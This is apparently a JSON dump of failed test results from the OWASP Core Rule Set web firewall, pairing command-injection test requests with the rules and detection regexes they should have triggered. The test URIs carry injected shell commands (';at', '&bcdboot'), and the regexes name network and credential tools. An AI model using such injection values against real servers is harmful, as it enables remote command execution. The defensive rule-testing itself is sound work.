          "text" : "  .932260 (base rule, PL1, targets known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932240 (generic detection, PL2, targets generic evasion attempts)"
        }, {
          "type" : "Comment",
          "text" : "  .932236 (stricter sibling of 932230, 932235, 932250, 932260, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length)"
        }, {
          "type" : "Comment",
          "text" : "  ..932239 (sibling of 932236, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : "  ..932238 (stricter sibling of 932236, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - no excluded words)"
        }, {
          "type" : "Comment",
          "text" : "  .932237 (stricter sibling of 932230, 932235, 932250, 932260, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - with word boundaries"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932260.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932260"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:^|b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?y[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?x|(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?v|v[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?l)|w[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*|[ls][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e|n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?i[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:(?:[\\s\\x0b&\\),<>\\|]|$).*|o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)|[\\n\\r;=`\\{]|\\|\\|?|&&?|\\$(?:\\(\\(?|[\\[\\{])|<(?:\\(|<<)|>\\(|\\([\\s\\x0b]*\\))[\\s\\x0b]*(?:[\\$\\{]|(?:[\\s\\x0b]*\\(|!)[\\s\\x0b]*|[0-9A-Z_a-z]+=(?:[^\\s\\x0b]*|\\$(?:.*|.*)|[<>].*|'[^']*'|\\\"[^\\\"]*\\\")[\\s\\x0b]+)*[\\s\\x0b]*[\\\"']*(?:[\\\"'-\\+\\--9\\?A-\\]_a-z\\|]+/)?[\\\"'\\x5c]*(?:a(?:ddgroup|nsible|pparmor_[^\\s\\x0b]{1,10}\\b|rj(?:-register|disp)|tobm(?:[\\s\\x0b&\\),<>\\|]|$)|u(?:ditctl|repot|search))|b(?:ase(?:32|64|nc)|(?:lkid|rwap|yobu)(?:[\\s\\x0b&\\),<>\\|]|$)|sd(?:cat|iff|tar)|u(?:iltin|nzip2|sybox)|z(?:c(?:at|mp)(?:[\\s\\x0b&\\),<>\\|]|$)|diff|e(?:grep|xe(?:[\\s\\x0b&\\),<>\\|]|$))|f?grep|ip2(?:[\\s\\x0b&\\),<>\\|]|$|recover)|less|more))|c(?:[89]9-gcc|h(?:(?:attr|mod|o(?:om|wn)|sh)(?:[\\s\\x0b&\\),<>\\|]|$)|ef-|g(?:passwd|rp(?:[\\s\\x0b&\\),<>\\|]|$))|pass)|lang\\+\\+|o(?:bc(?:[\\s\\x0b&\\),<>\\|]|$|run)|mm(?:[\\s\\x0b&\\),<>\\|]|$)|proc)|(?:p(?:an|io)|scli)(?:[\\s\\x0b&\\),<>\\|]|$))|d(?:(?:iff|mesg|vips)(?:[\\s\\x0b&\\),<>\\|]|$)|o(?:as(?:[\\s\\x0b&\\),<>\\|]|$)|cker-)|pkg(?:[\\s\\x0b&\\),\\-<>\\|]|$))|e(?:2fsck|(?:fax|grep|macs|nd(?:if|sw)|sac|xpr)(?:[\\s\\x0b&\\),<>\\|]|$))|f(?:d(?:(?:find|isk)(?:[\\s\\x0b&\\),<>\\|]|$)|u?mount)|grep(?:[\\s\\x0b&\\),<>\\|]|$)|iletest|ping(?:[\\s\\x0b&\\),6<>\\|]|$)|tp(?:stats|who))|g(?:(?:core|insh|z(?:cat|exe|ip))(?:[\\s\\x0b&\\),<>\\|]|$)|(?:etca|unzi)p|hc(?:-(?:[\\s\\x0b&\\),<>\\|]|$)|i(?:[\\s\\x0b&\\),\\-<>\\|]|$))|r(?:(?:cat|ep)(?:[\\s\\x0b&\\),<>\\|]|$)|oupmod))|(?:htop|jexec)(?:[\\s\\x0b&\\),<>\\|]|$)|i(?:(?:conv|ftop)(?:[\\s\\x0b&\\),<>\\|]|$)|pp(?:eveprinter|find|tool))|l(?:ast(?:comm(?:[\\s\\x0b&\\),<>\\|]|$)|log(?:in)?)|ess(?:echo|(?:fil|pip)e)|ftp(?:[\\s\\x0b&\\),<>\\|]|$|get)|osetup|s(?:(?:-F|cpu|hw|mod|of|pci|usb)(?:[\\s\\x0b&\\),<>\\|]|$)|b_release)|wp-download|z(?:4c(?:[\\s\\x0b&\\),<>\\|]|$|at)|c(?:at|mp)(?:[\\s\\x0b&\\),<>\\|]|$)|diff|[ef]?grep|less|m(?:a(?:[\\s\\x0b&\\),<>\\|]|$|dec|info)|ore)))|m(?:a(?:(?:ilq|wk)(?:[\\s\\x0b&\\),<>\\|]|$)|ster\\.passwd)|k(?:fifo|nod(?:[\\s\\x0b&\\),<>\\|]|$)|temp)|locate|ysql(?:[\\s\\x0b&\\),<>\\|]|$|admin|dump(?:slow)?|hotcopy|show))|n(?:(?:a(?:sm|wk)|(?:ma|ohu)p|ping|roff|stat)(?:[\\s\\x0b&\\),<>\\|]|$)|c(?:\\.(?:openbsd|traditional)|at(?:[\\s\\x0b&\\),<>\\|]|$))|et(?:(?:c|st)at|kit-ftp|plan))|o(?:nintr|pkg(?:[\\s\\x0b&\\),<>\\|]|$))|p(?:d(?:b(?:2mb|3(?:[\\s\\x0b&\\),\\.<>\\|]|$))|ksh(?:[\\s\\x0b&\\),<>\\|]|$))|(?:er(?:f|l5?)|(?:ft|gre)p|i(?:gz|ng6)|(?:op|ush)d|s(?:ed|ql))(?:[\\s\\x0b&\\),<>\\|]|$)|hp(?:-cgi|[57](?:[\\s\\x0b&\\),<>\\|]|$))|k(?:exec|ill(?:[\\s\\x0b&\\),<>\\|]|$))|rint(?:env|f(?:[\\s\\x0b&\\),<>\\|]|$))|tar(?:[\\s\\x0b&\\),<>\\|]|$|diff|grep)|wd\\.db|y(?:3?versions|thon[23]))|r(?:(?:aku|bash|nano|pmdb|unc|vi(?:ew|m))(?:[\\s\\x0b&\\),<>\\|]|$)|e(?:alpath|boot(?:[\\s\\x0b&\\),<>\\|]|$))|m(?:dir(?:[\\s\\x0b&\\),<>\\|]|$)|t-(?:dump|tar)|user)|sync(?:-ssl|[\\s\\x0b&\\),<>\\|]|$))|s(?:(?:diff|ftp|lsh|ocat)(?:[\\s\\x0b&\\),<>\\|]|$)|e(?:ndmail(?:[\\s\\x0b&\\),<>\\|]|$)|t(?:cap|env|sid))|h(?:\\.distrib|uf(?:[\\s\\x0b&\\),<>\\|]|$))|pwd\\.db|sh-(?:a(?:dd|gent)|copy-id)|td(?:err|in(?:[\\s\\x0b&\\),<>\\|]|$)|out)|udo(?:-rs|[\\s\\x0b&\\),<>_\\|]|$|edit|replay)|vn(?:a(?:dmin|uthz)|bench|dumpfilter|fsfs|look|mucc|rdump|s(?:erve|ync)|version)|ysctl)|t(?:(?:ailf|ftp|mux)(?:[\\s\\x0b&\\),<>\\|]|$)|c(?:l?sh(?:[\\s\\x0b&\\),<>\\|]|$)|p(?:ing|traceroute))|elnet|r(?:aceroute6?|off(?:[\\s\\x0b&\\),<>\\|]|$)))|u(?:n(?:(?:iq|rar|xz)(?:[\\s\\x0b&\\),<>\\|]|$)|lz(?:4(?:[\\s\\x0b&\\),<>\\|]|$)|ma)|pigz|zstd)|ser(?:(?:ad|mo)d|del))|vi(?:(?:gr|pw|rsh)(?:[\\s\\x0b&\\),<>\\|]|$)|sudo(?:-rs)?)|w(?:get(?:[\\s\\x0b&\\),<>\\|]|$)|hoami)|x(?:(?:args|etex|more|pad|term)(?:[\\s\\x0b&\\),<>\\|]|$)|z(?:c(?:at|mp)(?:[\\s\\x0b&\\),<>\\|]|$)|d(?:ec(?:[\\s\\x0b&\\),<>\\|]|$)|iff)|[ef]?grep|less|more))|z(?:(?:c(?:at|mp)|diff|grep|less|run)(?:[\\s\\x0b&\\),<>\\|]|$)|[ef]grep|ip(?:c(?:loak|mp)|details|grep|info|(?:merg|not)e|split|tool)|mo(?:dload|re(?:[\\s\\x0b&\\),<>\\|]|$))|std(?:[\\s\\x0b&\\),<>\\|]|$|(?:ca|m)t|grep|less)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932260
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Direct Unix Command Execution"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932371",
    "test_id" : 1,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932371.yaml",
    "description" : "Windows Command Injection: at command injection scheduling a command",
    "cause" : "failed expect_id check: 932371 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "Windows Command Injection: at command injection scheduling a command",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?cmd=;at%202:00%20\"echo%20test\"",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932371 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932371,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This rule is a stricter sibling to 932370"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule contains additional commands that are not matched at PL-1 due to being false positive prone or common english words."
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:[\\n\\r;`\\{]|\\|\\|?|&&?)[\\s\\x0b]*[\\s\\x0b\\\"'\\(,@]*(?:[\\\"'\\.-9A-Z_a-z]+/|(?:[\\\"'\\x5c\\^]*[0-9A-Z_a-z][\\\"'\\x5c\\^]*:[^\\x5c]*|[ \\\"'\\.-9A-Z\\x5c\\^_a-z]*)\\x5c)?[\\\"\\^]*a[\\\"\\^]*t[\\\"\\^]*[\\s\\x0b,\\./;<>].*(?:\\.[\\\"\\^]*[0-9A-Z_a-z]+)?\\b"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932371
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows Command Injection"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932380",
    "test_id" : 1,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932380.yaml",
    "description" : "Windows shell command injection with 'bcdboot': view=image.jpg%26bcdboot < file.txt\nMatch input redirection to bcdboot\n",
    "cause" : "failed expect_id check: 932380 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected" ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "Windows shell command injection with 'bcdboot': view=image.jpg%26bcdboot < file.txt\nMatch input redirection to bcdboot\n",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "Proxy-Connection" : "keep-alive",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?view%3Dimage.jpg%26bcdboot%20%3C%20file.txt",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932380 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932380,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows shell command injections."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " New in CRSv4: The rules 932110 and 932115 were reorganized and renumbered to 932370 and 932380."
        }, {
          "type" : "Comment",
          "text" : " The new rules target specific Windows binaries to simplify future updates of the command list."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " See rule 932370 above for further explanation."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is case-insensitive."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932380.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932380"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:[\\n\\r;`\\{]|\\|\\|?|&&?)[\\s\\x0b]*[\\s\\x0b\\\"'\\(,@]*(?:[\\\"'\\.-9A-Z_a-z]+/|(?:[\\\"'\\x5c\\^]*[0-9A-Z_a-z][\\\"'\\x5c\\^]*:[^\\x5c]*|[ \\\"'\\.-9A-Z\\x5c\\^_a-z]*)\\x5c)?[\\\"\\^]*(?:a[\\\"\\^]*(?:s[\\\"\\^]*s[\\\"\\^]*o[\\\"\\^]*c|t[\\\"\\^]*(?:m[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m|t[\\\"\\^]*r[\\\"\\^]*i[\\\"\\^]*b)|u[\\\"\\^]*(?:d[\\\"\\^]*i[\\\"\\^]*t[\\\"\\^]*p[\\\"\\^]*o[\\\"\\^]*l|t[\\\"\\^]*o[\\\"\\^]*(?:c[\\\"\\^]*(?:h[\\\"\\^]*k|o[\\\"\\^]*n[\\\"\\^]*v)|(?:f[\\\"\\^]*m|m[\\\"\\^]*o[\\\"\\^]*u[\\\"\\^]*n)[\\\"\\^]*t)))|b[\\\"\\^]*(?:c[\\\"\\^]*d[\\\"\\^]*(?:b[\\\"\\^]*o[\\\"\\^]*o|e[\\\"\\^]*d[\\\"\\^]*i)[\\\"\\^]*t|(?:d[\\\"\\^]*e[\\\"\\^]*h[\\\"\\^]*d|o[\\\"\\^]*o[\\\"\\^]*t)[\\\"\\^]*c[\\\"\\^]*f[\\\"\\^]*g|i[\\\"\\^]*t[\\\"\\^]*s[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i[\\\"\\^]*n)|c[\\\"\\^]*(?:a[\\\"\\^]*c[\\\"\\^]*l[\\\"\\^]*s|e[\\\"\\^]*r[\\\"\\^]*t[\\\"\\^]*(?:r[\\\"\\^]*e[\\\"\\^]*q|u[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*l)|h[\\\"\\^]*(?:c[\\\"\\^]*p|d[\\\"\\^]*i[\\\"\\^]*r|g[\\\"\\^]*(?:l[\\\"\\^]*o[\\\"\\^]*g[\\\"\\^]*o[\\\"\\^]*n|p[\\\"\\^]*o[\\\"\\^]*r[\\\"\\^]*t|u[\\\"\\^]*s[\\\"\\^]*r)|k[\\\"\\^]*(?:d[\\\"\\^]*s[\\\"\\^]*k|n[\\\"\\^]*t[\\\"\\^]*f[\\\"\\^]*s))|l[\\\"\\^]*e[\\\"\\^]*a[\\\"\\^]*n[\\\"\\^]*m[\\\"\\^]*g[\\\"\\^]*r|m[\\\"\\^]*(?:d(?:[\\\"\\^]*k[\\\"\\^]*e[\\\"\\^]*y)?|s[\\\"\\^]*t[\\\"\\^]*p)|s[\\\"\\^]*c[\\\"\\^]*r[\\\"\\^]*i[\\\"\\^]*p[\\\"\\^]*t)|d[\\\"\\^]*(?:c[\\\"\\^]*(?:d[\\\"\\^]*i[\\\"\\^]*a[\\\"\\^]*g|g[\\\"\\^]*p[\\\"\\^]*o[\\\"\\^]*f[\\\"\\^]*i[\\\"\\^]*x)|e[\\\"\\^]*(?:f[\\\"\\^]*r[\\\"\\^]*a[\\\"\\^]*g|l)|f[\\\"\\^]*s[\\\"\\^]*(?:d[\\\"\\^]*i[\\\"\\^]*a|r[\\\"\\^]*m[\\\"\\^]*i)[\\\"\\^]*g|i[\\\"\\^]*(?:a[\\\"\\^]*n[\\\"\\^]*t[\\\"\\^]*z|r|s[\\\"\\^]*(?:k[\\\"\\^]*(?:c[\\\"\\^]*o[\\\"\\^]*(?:m[\\\"\\^]*p|p[\\\"\\^]*y)|p[\\\"\\^]*(?:a[\\\"\\^]*r[\\\"\\^]*t|e[\\\"\\^]*r[\\\"\\^]*f)|r[\\\"\\^]*a[\\\"\\^]*i[\\\"\\^]*d|s[\\\"\\^]*h[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*o[\\\"\\^]*w)|p[\\\"\\^]*d[\\\"\\^]*i[\\\"\\^]*a[\\\"\\^]*g))|n[\\\"\\^]*s[\\\"\\^]*c[\\\"\\^]*m[\\\"\\^]*d|(?:o[\\\"\\^]*s[\\\"\\^]*k[\\\"\\^]*e|r[\\\"\\^]*i[\\\"\\^]*v[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*q[\\\"\\^]*u[\\\"\\^]*e[\\\"\\^]*r)[\\\"\\^]*y)|e[\\\"\\^]*(?:n[\\\"\\^]*d[\\\"\\^]*l[\\\